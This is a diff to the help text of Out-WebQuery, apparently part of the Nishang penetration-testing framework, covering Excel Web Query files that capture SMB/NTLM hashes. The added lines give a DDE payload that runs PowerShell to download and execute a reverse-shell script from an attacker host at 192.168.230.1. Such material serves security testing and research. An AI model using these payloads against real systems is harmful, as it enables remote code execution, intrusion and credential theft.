@@ -14,6 +14,8 @@ The attacker must run a web server which is able to log the requests made to it 
 server can be used, Start-CaptureServer.ps1 in the Utility directory of Nishang could be used as well. Start-CaptureServer
 supports Basic auth for capturing credentials in plain and NTLM authentication for capturing hashes.
 
+The WebQuery file can also be used for DDE attacks and thus command execution on the target. See examples for more. 
+
 .PARAMETER URL
 URL to which the connection from the target is made. A web server which logs requests must run at this URL.
 
@@ -41,11 +43,17 @@ PS > Out-WebQuery -URL \\192.168.1.2\C$
 Use above command to generate a Web Query file. When a user opens it, his SMB hash would be captured
 on the attacker's machine where Start-CaptureServer is running.
 
+PS > Out-WebQuery -URL http://192.168.230.1/calc.html
+Use above command to generate a Web Query file. When a user opens it, the contents of calc.html are loaded.
+The contents of calc.html can be used for command execution:
+=cmd|'/c powershell iex(New-Object Net.WebClient).DownloadString(''http://192.168.230.1/Invoke-PowerShellTcpOneLine.ps1'') '!A0
+
 
 .LINK
 http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
 https://github.com/samratashok/nishang
 https://twitter.com/subTee/status/631509345918783489
+https://twitter.com/curi0usJack/status/886054701413933060
 https://support.microsoft.com/en-us/kb/157482
 #>
     [CmdletBinding()] Param(
